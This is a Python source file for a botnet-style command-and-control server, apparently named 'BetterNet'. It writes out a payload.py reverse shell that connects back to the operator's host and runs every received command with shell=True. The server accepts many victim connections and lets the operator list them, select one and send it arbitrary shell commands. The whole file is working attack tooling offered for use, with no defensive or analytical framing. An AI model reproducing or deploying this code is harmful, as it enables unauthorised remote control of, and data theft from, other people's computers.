import socket
import threading
from queue import Queue
import os
import sys

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    green = '\033[0;32m'
    end = '\033[m'


def create_socket():
    try:
        global host
        global port
        global s
        s = socket.socket()
        host = sys.argv[1]
        port = sys.argv[2]

        def payload_create(l_host, l_port):
            p = f"""
import socket
import os
import subprocess
try:
    s = socket.socket()
    host = "{l_host}"
    port = {l_port}

    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
except Exception as error:
    s.close()
    exit(error)"""
            with open("payload.py", "w") as file:
                file.write(p)
        payload_create(l_host=host, l_port=port)

    except socket.error as msg:
        print(f"[{Colors.red}-{Colors.end}]Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print(f"\n{Colors.green}Binding the Port:{Colors.end} ", int(port), f"\n{Colors.green}Payload Was Generated{Colors.end}\n{Colors.green}{Colors.end}")

        s.bind((host, int(port)))
        s.listen(300)

    except socket.error as msg:
        print(f"[{Colors.red}-{Colors.end}]Socket Binding error" + str(
            msg) + "\n" + f"[{Colors.green}Retrying{Colors.end}]")
        bind_socket()


def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)

            all_connections.append(conn)
            all_address.append(address)

            print(f"{Colors.green}Connection has been established:{Colors.end} " + address[0])

        except (socket.error, ConnectionError):
            print(f"[{Colors.red}-{Colors.end}] Error Accepting Connections")


def start():
    n = 0
    while True:
        n += 1
        if n > 1022220:
            n = 0
            cmd = input(f"({Colors.red}Spawned{Colors.end}) [BetterNet]:~#")
            if cmd == 'list' or cmd == "show all" or cmd == "show":
                list_connections()
            elif cmd == "help" or cmd == "?":
                print(f"""
    {Colors.red}╔══════════════════════════════════════════════════════════════════╗
    {Colors.red}║{Colors.end}    list/show  -  list all current connections                    {Colors.red}║
    {Colors.red}║{Colors.end}    exit/quit  -  exit out of the net                             {Colors.red}║ 
    {Colors.red}║{Colors.end}    select/use -  use one of the current accepted connections     {Colors.red}║
    {Colors.red}╚══════════════════════════════════════════════════════════════════╝{Colors.end}""")
            elif cmd == 'quit' or cmd == 'exit':
                s.close()
                exit()
            elif 'select' in cmd or 'use' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)
        else:
            pass


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except Exception as er:
            print(er, f"{Colors.green}Proceeding{Colors.end}")
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print(f"{Colors.green}----Clients----{Colors.end}" + "\n" + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except Exception as e:
        print(e)
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit' or cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except socket.error:
            print(f"[{Colors.red}-{Colors.end}] Error Sending Commands")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


try:
    create_workers()
    create_jobs()
except Exception as error:
    print(error)
